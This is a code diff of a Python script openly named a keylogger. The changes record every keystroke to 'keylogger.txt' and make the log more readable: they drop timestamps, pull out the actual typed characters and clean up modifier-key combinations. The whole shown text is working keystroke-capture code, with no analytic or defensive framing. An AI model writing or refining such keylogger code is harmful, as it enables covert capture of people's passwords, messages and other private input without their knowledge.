@@ -9,7 +9,7 @@ with open("keylogger.txt", "w"):
 # Define the location of the keylog
 keylogger_filename = r"keylogger.txt"
 # Define the format of the keylog
-logging.basicConfig(filename=keylogger_filename, level=logging.DEBUG, format="%(asctime)s: %(message)s")
+logging.basicConfig(filename=keylogger_filename, level=logging.DEBUG, format="%(message)s")
 
 # Track the state of modifier keys
 modifier_keys = {
@@ -42,12 +42,18 @@ def on_press(key):
         if active_modifiers:
             # Interpret control key combinations
             key_str = interpret_control_key(key)
-            combination = " + ".join(active_modifiers) + f" + {key_str}"
+            combination = " + ".join(active_modifiers) + " + " + str(key_str).strip("'")
             print(f"Combination pressed: {combination}")
             logging.info(combination)
         else:
-            print(f"Single key pressed: {key}")
-            logging.info(str(key))
+            # Determine the key representation
+            if hasattr(key, 'char') and key.char is not None:
+                key_str = key.char  # Get the character directly
+            else:
+                key_str = str(key)  # For special keys (e.g., Key.enter, Key.shift, etc.)
+
+            print("Single key pressed: " + key_str)
+            logging.info(key_str)
 
 def on_release(key):
     # Reset the specific modifier state when it’s released
